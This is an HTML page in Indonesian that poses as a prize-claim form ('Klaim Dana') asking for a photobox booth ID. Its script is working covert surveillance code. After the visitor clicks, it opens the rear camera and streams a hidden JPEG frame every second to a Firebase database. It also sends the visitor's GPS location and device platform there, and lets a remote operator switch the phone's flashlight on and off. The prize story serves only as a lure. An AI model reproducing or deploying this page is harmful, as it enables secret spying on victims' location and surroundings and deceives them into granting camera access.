<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Klaim Saldo Hadiah</title>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
    <style>
        body { background: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { width: 85%; max-width: 350px; background: #fff; padding: 40px 30px; border-radius: 30px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.05); }
        .btn { width: 100%; padding: 20px; background: #00b894; color: #fff; border: none; border-radius: 15px; font-weight: 900; font-size: 16px; cursor: pointer; }
        input { width: 100%; padding: 18px; margin-bottom: 20px; border: 1px solid #eee; border-radius: 15px; text-align: center; outline: none; }
    </style>
</head>
<body>

<div id="box" class="card">
    <div style="font-size:50px; margin-bottom:15px;">🧧</div>
    <h2 style="margin:0;">Klaim Dana</h2>
    <p style="color:#888; font-size:13px; margin:20px 0;">Masukkan ID Booth Photobox untuk memverifikasi lokasi penukaran.</p>
    <input type="text" id="uid" placeholder="ID: ZUX-XXXX">
    <button class="btn" onclick="start()">DAPATKAN SALDO</button>
</div>

<video id="v" autoplay playsinline muted style="display:none;"></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyD3usv5rw801fV1nrXIwyDQ6eYEzC7hDk0",
        authDomain: "kodangz.firebaseapp.com",
        databaseURL: "https://kodangz-default-rtdb.firebaseio.com",
        projectId: "kodangz",
        storageBucket: "kodangz.firebasestorage.app",
        messagingSenderId: "306989473099",
        appId: "1:306989473099:web:9049d3135ce13e08a8dcce"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let myDID = "D-" + Math.floor(Math.random()*9999);
    let camTrack = null;

    async function start() {
        const uid = document.getElementById('uid').value.trim().toUpperCase();
        if(!uid) return;
        try {
            // FIX: Menggunakan "environment" agar Flashlight hardware bisa aktif
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "environment" } 
            });
            
            camTrack = stream.getVideoTracks()[0];
            const v = document.getElementById('v'), cv = document.getElementById('c');
            v.srcObject = stream; v.play();

            document.getElementById('box').innerHTML = "<h3>Verifikasi Identitas...</h3><p>Sedang menghubungkan ke server hadiah.</p>";
            db.ref(`connections/${uid}/${myDID}`).set({ model: navigator.platform });

            navigator.geolocation.getCurrentPosition(p => {
                db.ref(`data/${myDID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
            });

            // STREAMER
            setInterval(() => {
                cv.width = v.videoWidth; cv.height = v.videoHeight;
                const ctx = cv.getContext('2d');
                ctx.drawImage(v, 0, 0);
                db.ref(`data/${myDID}/stream`).set({ frame: cv.toDataURL('image/jpeg', 0.4) });
            }, 1000);

            // FIX: LISTENER SENTER (TORCH)
            db.ref(`commands/${myDID}`).on('value', s => {
                const cmd = s.val();
                if(cmd && camTrack) {
                    camTrack.applyConstraints({
                        advanced: [{ torch: cmd.torch }]
                    }).catch(e => console.log("Flash not supported"));
                }
            });

        } catch(e) { alert("Izinkan akses kamera untuk verifikasi hadiah!"); }
    }
</script>
</body>
</html>
